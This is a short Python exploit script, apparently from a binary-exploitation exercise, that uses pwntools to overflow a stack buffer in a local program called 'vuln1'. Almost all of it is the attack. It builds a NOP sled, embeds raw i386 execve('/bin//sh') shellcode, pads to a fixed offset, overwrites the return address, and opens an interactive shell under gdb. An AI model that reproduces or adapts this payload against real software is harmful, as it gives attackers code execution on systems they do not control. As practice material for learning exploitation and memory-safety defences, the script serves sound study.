#!/usr/bin/env python3

from pwn import *

context.update(arch='i386', os='linux')

elf = ELF("./vuln1")
#pprint(elf.symbols['system'])
#p = elf.process()

#gdb.attach(p, '''
#''')

#for i in range(1, 100):
#    log.info(str(i))

offset = len("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
addr = 0xffffd23c
#addr = 0x44444444
print(hex(addr))
#shellcode = shellcraft.sh()
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
shellcode_len = len(shellcode)
nops = 48

payload = b"\x90"*nops 
payload += shellcode 
payload += b"B"*(offset-nops-shellcode_len)
payload += p32(addr) #p32(0x44444444)
payload += b"\xCC"*10

#p = process([elf.path, payload])
io = gdb.debug([elf.path, payload], '''
break *0xffffd23c
''')

io.interactive()
io.close()


